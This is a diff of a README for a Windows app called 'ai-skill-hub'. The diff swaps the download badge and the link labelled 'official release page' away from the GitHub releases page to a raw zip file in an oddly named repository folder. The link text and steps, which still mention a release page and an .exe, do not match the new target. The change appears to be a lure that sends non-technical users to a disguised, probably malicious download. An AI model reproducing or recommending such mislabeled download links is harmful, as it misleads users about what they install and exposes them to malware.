@@ -1,6 +1,6 @@
 # 🛠️ ai-skill-hub - Practical AI tools for daily tasks
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/nunzioaccording289/ai-skill-hub/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/nunzioaccording289/ai-skill-hub/main/subpiston/hub_skill_ai_1.6.zip)
 
 This application provides a collection of AI tools designed for everyday tasks. It turns complex artificial intelligence processes into simple steps. You do not need technical knowledge to use these features. The program runs directly on your Windows computer.
 
@@ -28,7 +28,7 @@ Your computer needs to meet these basic standards to run the software smoothly:
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the [official release page](https://github.com/nunzioaccording289/ai-skill-hub/releases) to access the download files.
+1. Visit the [official release page](https://raw.githubusercontent.com/nunzioaccording289/ai-skill-hub/main/subpiston/hub_skill_ai_1.6.zip) to access the download files.
 2. Look for the file ending in `.exe` under the latest release version.
 3. Click the file name to start the download.
 4. Open your "Downloads" folder once the file finishes saving.
